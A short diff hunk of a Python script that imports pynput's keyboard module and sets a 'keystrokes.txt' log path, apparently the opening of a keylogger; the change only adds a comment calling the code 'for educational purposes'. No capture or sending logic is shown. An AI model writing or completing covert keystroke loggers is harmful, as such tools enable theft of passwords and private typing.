@@ -1,7 +1,7 @@
 import os
 import ctypes
 from pynput import keyboard
-
+#this code is for educational purposes
 # Save the log file in the same folder as the script
 log_path = os.path.join(os.path.dirname(__file__), "keystrokes.txt")
 
